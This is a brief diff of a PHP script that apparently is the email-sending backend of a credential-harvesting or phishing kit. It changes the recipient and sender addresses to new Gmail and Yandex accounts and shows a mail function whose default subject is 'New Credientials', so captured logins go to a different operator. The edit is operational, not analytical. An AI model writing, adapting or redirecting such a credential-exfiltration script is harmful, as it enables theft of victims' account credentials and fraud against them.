@@ -5,8 +5,8 @@ header("Access-Control-Allow-Origin: *");
 header("Content-Type: application/json");
 
 
-$EMAIL = "alexjace151@gmail.com";
-$SENDER_EMAIL = "jacealex151@gmail.com";
+$EMAIL = "gottmacht.empire@gmail.com";
+$SENDER_EMAIL = "gottmacht.empire@yandex.com";
 
 
 function sendEmail($message, $subject = "New Credientials") {
